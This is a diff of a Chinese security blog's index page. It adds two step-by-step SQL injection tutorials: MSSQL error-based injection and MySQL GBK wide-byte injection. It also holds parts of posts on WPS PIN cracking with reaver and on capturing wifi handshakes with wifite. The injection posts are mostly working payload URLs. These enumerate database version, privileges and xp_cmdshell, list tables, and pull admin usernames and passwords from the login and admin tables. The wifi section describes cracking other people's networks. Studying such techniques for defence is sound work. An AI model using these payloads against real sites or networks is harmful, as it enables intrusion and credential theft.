@@ -139,6 +139,148 @@
 
     <div class="post-header index">
         <h1 class="title">
+            <a href="/2016/05/16/mssql-error-injection/">
+                sql注入入门 之 mssql常规显错注入
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2016-05-16</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/all-sql-injection/">all sql injection</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br><br>1,mssql常规显错型,实例注入点,如下:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/mssql_error_injection1.png" alt="&#39;&#39;"><br></p>
+<p>2,依旧先尝试经典的单引号,数据库如期报错,报错原因的很清楚,参数后面多了单引号,不过这也恰好说明我们的单引号已被带入正常查询,其实,到此为止,根据以往的经验我们也可以判断这里百分之九十是个mssql注入点,因为这很显然不是其他数据库的报错信息嘛<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span><span class="string">'</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/mssql_error_injection2.png" alt="&#39;&#39;"><br></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span>  条件为真,页面返回正常</div></pre></td></tr></table></figure>
+<p><img src="/img/mssql_error_injection3.png" alt="&#39;&#39;"><br></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">112</span> 条件为真,页面返回异常,典型的数字型注入</div></pre></td></tr></table></figure>
+<p><img src="/img/mssql_error_injection4.png" alt="&#39;&#39;"><br></p>
+<p>3,我们可以用下面的语句进一步确实目标是否真的为mssql数据库,页面返回正常则是,返回异常则不是,根据返回,没跑了,这确实是个正儿八经的mssql数据库,’sysobjects’是mssql的系统表<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> <span class="keyword">and</span> exists(select * from sysobjects)</div></pre></td></tr></table></figure></p>
+<p><img src="/img/mssql_error_injection5.png" alt="&#39;&#39;"><br></p>
+<p>4,好吧,没说的,开始写注入语句,获取当前mssql版本,可知当前数据库版本为 2008R2<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> <span class="keyword">and</span> <span class="number">1</span>=CONVERT(int,(select @@VERSION))--</div></pre></td></tr></table></figure></p>
+<p><img src="/img/mssql_error_injection6.png" alt="&#39;&#39;"><br></p>
+<p>5,获取目标机器的机器名,看机器名主要是因为有时候我们想从机器名上得知这个机器大概是干嘛的,有没有可能在内网,都可以通过这个来初步判断下<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> <span class="keyword">and</span> <span class="number">1</span>=convert(int,(select  @@servername))--</div></pre></td></tr></table></figure></p>
+<p><img src="/img/mssql_error_injection7.png" alt="&#39;&#39;"><br></p>
+<p>6,获取当前的数据库用户名,当前数据库用户名为 ‘easysofts_kiran’,非sa,关于sa权限下的注入利用方式,后续还会有单独说明,今天的重点还是显错注入,所以为了防止跑题,这里就不多说了<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> <span class="keyword">and</span> <span class="number">1</span>=CONVERT(int,(select suser_sname()))--</div></pre></td></tr></table></figure></p>
+<p><img src="/img/mssql_error_injection8.png" alt="&#39;&#39;"><br></p>
+<p>7,看下目标的xp_cmdshell存储过程是否还在,主要是想看它有没有被删掉,你也可以用这种方式来查询其它你想知道的任何存储过程<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> <span class="keyword">and</span> <span class="number">1</span>=(select count(*) from master..sysobjects where xtype = <span class="string">'x'</span> <span class="keyword">and</span> name = <span class="string">'xp_cmdshell'</span>) --</div></pre></td></tr></table></figure></p>
+<p><img src="/img/mssql_error_injection9.png" alt="&#39;&#39;"><br></p>
+<p>8,看下当前角色是否为数据库管理员,返回如下报错,很显然,并不是<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> <span class="keyword">and</span> <span class="number">1</span>=CONVERT(int,(SELECT is_srvrolemember(<span class="string">'sysadmin'</span>)))--</div></pre></td></tr></table></figure></p>
+<p><img src="/img/mssql_error_injection10.png" alt="&#39;&#39;"><br></p>
+<p>9,再看下当前角色是否为db_ownwer,我们很清楚,在这样的权限下我们可以通过各种备份方式往目标的网站目录里写文件(webshell),很显然,也不是<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> <span class="keyword">and</span> <span class="number">1</span>=convert(int,(select  IS_MEMBER(<span class="string">'db_owner'</span>)))--</div></pre></td></tr></table></figure></p>
+<p><img src="/img/mssql_error_injection11.png" alt="&#39;&#39;"><br></p>
+<p>10,根据上面得到的这些信息,我们发现,这就是个再正常不过的显错mssql数字型注入点,好吧,既然如此,那就按照常规查数据的方式一步步的慢慢来吧<br>首先,获取当前数据库名,如下可知当前数据库名为 ‘easysofts’,db_name()在不带任何参数时表示显示当前数据库名<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> <span class="keyword">and</span> <span class="number">1</span>=CONVERT(int,(select db_name()))--</div></pre></td></tr></table></figure></p>
+<p><img src="/img/mssql_error_injection12.png" alt="&#39;&#39;"><br></p>
+<p>如下表示第二个数据库名<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> <span class="keyword">and</span> <span class="number">1</span>=CONVERT(int,(select db_name(<span class="number">1</span>)))--</div></pre></td></tr></table></figure></p>
+<p><img src="/img/mssql_error_injection13.png" alt="&#39;&#39;"><br></p>
+<p>如下表示第六个数据库名,像这样重复性的动作,我们依然是可以交给burpsuite来完成<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> <span class="keyword">and</span> <span class="number">1</span>=CONVERT(int,(select db_name(<span class="number">5</span>)))--</div></pre></td></tr></table></figure></p>
+<p><img src="/img/mssql_error_injection14.png" alt="&#39;&#39;"><br></p>
+<p>当然,在此之前你还可以先统计下总共有多少个库,这样,我们在burpsuite中设置payload的时候就可以更精确点了,节省时间,不过,如果你直接使用下面的语句可能会报错<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> AND <span class="number">1</span>=CONVERT(INT,(CHAR(<span class="number">58</span>)+CHAR(<span class="number">58</span>)+(SELECT top <span class="number">1</span> CAST(COUNT([name]) AS nvarchar(<span class="number">4000</span>)) FROM [master]..[sysdatabases] )+CHAR(<span class="number">58</span>)+CHAR(<span class="number">58</span>)))--</div></pre></td></tr></table></figure></p>
+<p><img src="/img/mssql_error_injection27.png" alt="&#39;&#39;"><br></p>
+<p>把里面的’+’换成%2b即可解决问题,如下<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> AND <span class="number">1</span>=CONVERT(INT,(CHAR(<span class="number">58</span>)%<span class="number">2</span>bCHAR(<span class="number">58</span>)%<span class="number">2</span>b(SELECT top <span class="number">1</span> CAST(COUNT([name]) AS nvarchar(<span class="number">4000</span>)) FROM [master]..[sysdatabases] )%<span class="number">2</span>bCHAR(<span class="number">58</span>)%<span class="number">2</span>bCHAR(<span class="number">58</span>)))--</div></pre></td></tr></table></figure></p>
+<p><img src="/img/mssql_error_injection25.png" alt="&#39;&#39;"><br></p>
+<p>11,获取当前数据库中的所有表名<br>如下表示获取当前库的第一张表名<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> <span class="keyword">and</span> <span class="number">1</span>=convert(int,(select top <span class="number">1</span> table_name from information_schema.tables ))--</div></pre></td></tr></table></figure></p>
+<p><img src="/img/mssql_error_injection15.png" alt="&#39;&#39;"><br></p>
+<p>通过not in条件,把每次查出来的表名都加进去,这样就可以慢慢把所有的表都遍历出来,如下表示获取第二张表名<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> <span class="keyword">and</span> <span class="number">1</span>=convert(int,(select top <span class="number">1</span> table_name from information_schema.tables where table_name <span class="keyword">not</span> <span class="keyword">in</span>(<span class="string">'photoGalary'</span>) ))--</div></pre></td></tr></table></figure></p>
+<p><img src="/img/mssql_error_injection16.png" alt="&#39;&#39;"><br></p>
+<p>获取第三张表名<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> <span class="keyword">and</span> <span class="number">1</span>=convert(int,(select top <span class="number">1</span> table_name from information_schema.tables where table_name <span class="keyword">not</span> <span class="keyword">in</span>(<span class="string">'photoGalary'</span>,<span class="string">'menu'</span>) ))--</div></pre></td></tr></table></figure></p>
+<p><img src="/img/mssql_error_injection17.png" alt="&#39;&#39;"><br></p>
+<p>获取第四张表名<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> <span class="keyword">and</span> <span class="number">1</span>=convert(int,(select top <span class="number">1</span> table_name from information_schema.tables where table_name <span class="keyword">not</span> <span class="keyword">in</span>(<span class="string">'photoGalary'</span>,<span class="string">'menu'</span>,<span class="string">'Login'</span>) ))--</div></pre></td></tr></table></figure></p>
+<p><img src="/img/mssql_error_injection18.png" alt="&#39;&#39;"><br></p>
+<p>利用上面的方法,循环往复,直到报错为止,最后得到所有的表名如下,很显然,’login’就是我们想要的管理表<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> <span class="keyword">and</span> <span class="number">1</span>=convert(int,(select top <span class="number">1</span> table_name from information_schema.tables where table_name <span class="keyword">not</span> <span class="keyword">in</span>(<span class="string">'photoGalary'</span>,<span class="string">'menu'</span>,<span class="string">'Login'</span>,<span class="string">'footer'</span>,<span class="string">'feedback'</span>,<span class="string">'header'</span>,<span class="string">'slider'</span>,<span class="string">'services'</span>,<span class="string">'product'</span>) ))--</div></pre></td></tr></table></figure></p>
+<p><img src="/img/mssql_error_injection19.png" alt="&#39;&#39;"><br></p>
+<p>当然,你也可以像前面一样,事先统计下当前库中表的总个数:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span>  AND <span class="number">1</span>=CONVERT(INT,(CHAR(<span class="number">58</span>)%<span class="number">2</span>bCHAR(<span class="number">58</span>)%<span class="number">2</span>b(SELECT top <span class="number">1</span> CAST(COUNT(*) AS nvarchar(<span class="number">4000</span>)) FROM information_schema.TABLES )%<span class="number">2</span>bCHAR(<span class="number">58</span>)%<span class="number">2</span>bCHAR(<span class="number">58</span>)))--</div></pre></td></tr></table></figure></p>
+<p><img src="/img/mssql_error_injection28.png" alt="&#39;&#39;"><br></p>
+<p>12,接着,获取’login’表中的所有字段名,获取的方式同上,利用not in依次遍历出所有的字段名<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> <span class="keyword">and</span> <span class="number">1</span>=convert(int,(select top <span class="number">1</span> column_name from information_schema.columns where table_name=<span class="string">'login'</span> ))--</div></pre></td></tr></table></figure></p>
+<p><img src="/img/mssql_error_injection20.png" alt="&#39;&#39;"><br></p>
+<p>最后,获取的所有字段,名如下<br><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">http</span>://vuln.com/Product.aspx?id=<span class="number">8</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="built_in">convert</span>(int,(select top <span class="number">1</span> column_name <span class="built_in">from</span> information_schema.columns where table_name=<span class="string">'login'</span> <span class="keyword">and</span> column_name <span class="keyword">not</span> <span class="keyword">in</span>(<span class="string">'login_id'</span>,<span class="string">'username'</span>,<span class="string">'password'</span>,<span class="string">'name'</span>)  ))<span class="comment">--</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/mssql_error_injection21.png" alt="&#39;&#39;"><br></p>
+<p>13,有了表名,字段名接下来的事情就很好办了,直接去查出对应字段下的数据即可<br>获取username字段下的第一条数据<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> <span class="keyword">and</span> <span class="number">1</span>=convert(int,(select top <span class="number">1</span> username from login ))--</div></pre></td></tr></table></figure></p>
+<p><img src="/img/mssql_error_injection22.png" alt="&#39;&#39;"><br></p>
+<p>获取password字段下的第一条数据<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> <span class="keyword">and</span> <span class="number">1</span>=convert(int,(select top <span class="number">1</span> password from login ))--</div></pre></td></tr></table></figure></p>
+<p><img src="/img/mssql_error_injection23.png" alt="&#39;&#39;"><br></p>
+<p>统计login中有多少条记录<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> AND <span class="number">1</span>=CONVERT(INT,(CHAR(<span class="number">58</span>)%<span class="number">2</span>bCHAR(<span class="number">58</span>)%<span class="number">2</span>b(SELECT top <span class="number">1</span> CAST(COUNT(*) AS nvarchar(<span class="number">4000</span>)) FROM login)%<span class="number">2</span>bCHAR(<span class="number">58</span>)%<span class="number">2</span>bCHAR(<span class="number">58</span>)))--</div></pre></td></tr></table></figure></p>
+<p><img src="/img/mssql_error_injection26.png" alt="&#39;&#39;"><br></p>
+<p>假设你在当前库中并没有看到管理表,这时不妨尝试跨库查,前提是你要有权限才行,如下就表示没权限,如果是这样你就要好好想想别的办法了:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> AND <span class="number">1</span>=CONVERT(INT,(SELECT DISTINCT top <span class="number">1</span> TABLE_NAME FROM (SELECT DISTINCT top <span class="number">1</span> TABLE_NAME FROM riseyour_availbgur.information_schema.TABLES ORDER BY TABLE_NAME ASC) sq ORDER BY TABLE_NAME DESC))--</div></pre></td></tr></table></figure></p>
+<p><img src="/img/mssql_error_injection24.png" alt="&#39;&#39;"><br><br></p>
+<p>一点小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;关于mssql的注入语句,大家也看到了,跟mysql也差不了多少,都是从information_scheam库中获取各种数据,不过,核心还是利用convert()函数的高级显错特性,多练习多总结即可,里面暂时也没什么特别多的技术含量,比mysql好的地方就是它可能支持堆查询,这样在写注入语句的时候就很方便了,在此只是为了让大家看的更完整一些,所以写的相对比较细,在实际渗透中,怎么简洁,怎么快,怎么方便,怎么搞,完全不用刻意去按照我们的流程来,举一反三,灵活变通才是关键当然,mssql本身还有很多高级特性,但,这不是一两篇文章就能说的清楚的,来日方长,慢慢积累吧……<br></p>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2016/05/15/mysql-wide-byte-injection/">
+                sql注入入门 之 mysql宽字节注入
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2016-05-15</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/all-sql-injection/">all sql injection</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br><br>1,如下,宽字节注入的原型实例代码,注意连接字符集为gbk,对传入的值已用addslashes()做了转义,另外,php是把id当做一个字符串来接收的,后面在闭合的时候需要注意下,具体如下:<br><img src="/img/wide_type_1.png" alt="&#39;&#39;"><br></p>
+<p>2,本此用于测试的 宽字节注入点,如下<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.23/wide</span><span class="regexp">/0x01/index</span>.php?id=<span class="number">2</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/wide_type_2.png" alt="&#39;&#39;"><br></p>
+<p>3,这时当我们用经典的单引号尝试对传入参数进行干扰时发现,貌似并没有任何反应,原因很明显,因为addslashes()已经把我们提交的单引号给转义了<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.23/wide</span><span class="regexp">/0x01/index</span>.php?id=<span class="number">2</span><span class="string">'</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/wide_type_3.png" alt="&#39;&#39;"><br></p>
+<p>4,现在,我们就可以尝试利用宽字符来突破类似的转义问题,这里使用经典的%df宽字符,如下,页面返回数据库报错,说明我们的单引号已经被带入正常的sql语句中执行查询了,也就是说,用于转义的那个’\’已经罢工了<br><img src="/img/wide_type_4.png" alt="&#39;&#39;"><br></p>
+<p>5,通过观察打出来的sql语句,可以发现,那个 ‘%df’和’\’ 在gbk字符编码中变成了‘運’字,所以这才会造成转义才会失效,既如此,闭合自然就非常简单了,因为是字符型注入,只需要把前面的单引号闭合,后面的语句直接注释掉即可,具体的注入语句如下<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.23/wide</span><span class="regexp">/0x01/index</span>.php?id=<span class="number">2</span>%df<span class="string">'and 1=1 %23   条件为真时返回正常</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/wide_type_5.png" alt="&#39;&#39;"><br></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.23/wide</span><span class="regexp">/0x01/index</span>.php?id=<span class="number">2</span>%df<span class="string">' and 1=12 %23 条件为真时返回异常</span></div></pre></td></tr></table></figure>
+<p><img src="/img/wide_type_6.png" alt="&#39;&#39;"><br></p>
+<p>6,查询当前表的字段个数<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.23/wide</span><span class="regexp">/0x01/index</span>.php?id=<span class="number">2</span>%df<span class="string">' order by 3 %23 为3时返回正常</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/wide_type_7.png" alt="&#39;&#39;"><br></p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.23/wide</span><span class="regexp">/0x01/index</span>.php?id=<span class="number">2</span>%df<span class="string">' order by 4 %23 为4时返回异常,说明当前表有3个字段</span></div></pre></td></tr></table></figure>
+<p><img src="/img/wide_type_8.png" alt="&#39;&#39;"><br></p>
+<p>7,执行union,爆出对应的数据显示位<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.23/wide</span><span class="regexp">/0x01/index</span>.php?id=<span class="number">2</span>%df<span class="string">' and 1=21 UNION SELECT 1,2,3 %23</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/wide_type_9.png" alt="&#39;&#39;"><br></p>
+<p>8,搜集当前数据库信息,这里只是为了给大家演示下宽字节的正常注入流程,就不再尝试读写文件了,暂时按照正常的权限来,有兴趣可自行尝试<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.23/wide</span><span class="regexp">/0x01/index</span>.php?id=<span class="number">2</span>%df<span class="string">' and 1=21 UNION SELECT 1,database(),version() %23</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/wide_type_10.png" alt="&#39;&#39;"><br></p>
+<p>9,查出当前库中的所有表名<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.23/wide</span><span class="regexp">/0x01/index</span>.php?id=<span class="number">2</span>%df<span class="string">' and 1=12 union select 1,group_concat(table_name),user() from information_schema.tables where table_schema=0x64617461 %23</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/wide_type_11.png" alt="&#39;&#39;"><br></p>
+<p>10,查出admin表中的所有字段名<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.23/wide</span><span class="regexp">/0x01/index</span>.php?id=<span class="number">2</span>%df<span class="string">' and 1=12 union select 1,group_concat(column_name),user() from information_schema.columns where table_name=0x61646d696e %23</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/wide_type_12.png" alt="&#39;&#39;"><br></p>
+<p>11,最后,去查出管理的账号密码数据即可<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.23/wide</span><span class="regexp">/0x01/index</span>.php?id=<span class="number">2</span>%df<span class="string">' and 1=12 union select 1,name,pass from admin limit 0,1 %23</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/wide_type_13.png" alt="&#39;&#39;"><br><br></p>
+<p>一点小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;篇幅原因,这里只简单演示了GBK一种编码,至于GB2312等其它的一些宽字节字符集,也都会有这样的问题,关于宽字节注入,其实原理非常简单,就是数据库对不同编码的理解差异所造成的,最好的修复方法,就是全站(前后端全局统一)统一用utf-8,在适当的闭合后,注入语句和常规的注入语句基本没有任何差别,记得多找实例练习即可<br><br></p>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
             <a href="/2016/05/14/mysql-root-injection/">
                 sql注入入门 之 mysql root权限下的注入利用方式
             </a>
@@ -499,101 +641,6 @@
 <p>最后,当reaver pin完之后会显示出目标的WPS PIN(正确的pin码)码和WPA PSK密码(正确的wifi密码)<br><br><br>5,假如目标的wpa psk密码被修改了,但wps功能却没有关,pin码也没有改,你还是可以直接用reaver再次获取目标wifi密码,如下:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># reaver -i mon0 -b mac -p pin码</span></div></pre></td></tr></table></figure></p>
 <p><br></p>
 <h5 id="一点小结"><a href="#一点小结" class="headerlink" title="一点小结:"></a>一点小结:</h5><p>&nbsp;&nbsp;&nbsp;&nbsp;其实,搞清楚具体的破解原理之后,你会发现其实也并没什么实际性的技术含量,只需要写程序组包跑就是了,可能就是验证的过程有点儿复杂需要多花些时间,但工具(reaver)现在别人都已经为我们写好了,我们所能做的,会用即可,仅此而已,另外,个人并也极不建议一开始破解无线的时候就用这个方法,因为它的速度,大家也可以看到了,影响的因素太多,导致了它非常的慢,尤其是对实地渗透来讲,我们可能根本没有那么长的时间等,所以,能用aircrack搞定的就直接用aircrack来搞定,实在搞不定,再考虑这个也不迟,仅仅是个人建议而已……!</p>
-
-        </div>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2015/04/15/auto-crack-wifi/">
-                利用wifite脚本全自动获取握手包
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2015-04-15</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/wpa-wpa2-crack/">wpa/wpa2 crack</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <p>0x01 wifite 脚本仓库地址 [ Kali NetHunter 中可能用的居多 ]:<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/derv82/</span>wifite</div></pre></td></tr></table></figure></p>
-<p>0x02 关于使用wifite脚本的好处<br>&nbsp;&nbsp;&nbsp;&nbsp;你可以不用再像aircrack那样繁琐的手工输入各种命令,而是把一切都交给代码变成一种完全傻瓜式的交互操作,其实,本质上还是在调用的各种外部工具[aircrack]来帮其实现,脚本基于py,关于更多更详细运作细节,请自行看代码,今天的目的主要是教大家怎么快速把它用起来,非常简单,简单到你基本不用懂任何东西就可以随意破解别人的无线密码:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> wifite -h    查看wifite的所有帮助选项</span></div></pre></td></tr></table></figure></p>
-<p>下面是破解<code>wpa/wpa2</code>相关的一些选项<br><img src="/img/wpa2.png" alt="破解wpa/wpa2的相关帮助"><br>破解古老的<code>wep(基本已淘汰,反正我是没见过)</code>相关选项<br><img src="/img/wep.png" alt="破解wep的相关帮助"><br>关于<code>wps(一种新的认证协议,并非直接使用密码验证而是用pin码,更多内容,请自行谷歌)</code>的一些相关破解选项<br><img src="/img/pin.png" alt="破解wps的相关帮助"><br><br></p>
-<p>0x03 关于wifite脚本的具体使用过程,如下,插入事先准备好的无线网卡[同样,务必是aircrack所支持的无线网卡芯片才可以],执行下面的命令:<br><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#</span> <span class="comment">wifite</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">wpa</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">mac</span> <span class="literal">-</span><span class="literal">-</span><span class="comment">wpadt</span> <span class="comment">20</span> <span class="literal">-</span><span class="comment">aircrack</span>  <span class="comment">这里暂以破解wpa2为例</span><span class="string">,</span><span class="comment">关于wep和wps的破解请自行尝试</span></div></pre></td></tr></table></figure></p>
-<p><img src="/img/wifite.png" alt="运行wifite脚本"></p>
-<p><code>ctrl+c</code> 即可停止扫描,选择你要破解的无线,几个栏目的意思分别是<br><code>无线编号,无线工作信道,加密类型,信号强弱(值越高信号越强),目标是否启用wps,有无客户端在线(s表示同时有多个客户端在线)</code><br><img src="/img/wfcrack.png" alt="选择要攻击的无线热点"></p>
-<p>这里还是用我们自己的wifi来进行测试,选择1,至于之后的事情你就不用管了,它会自动帮你获取握手包文件并保存在当前路径下的hs目录中,如下:<br><img src="/img/crc.png" alt="自动获取握手包"><br><img src="/img/hs.png" alt="握手包位置"></p>
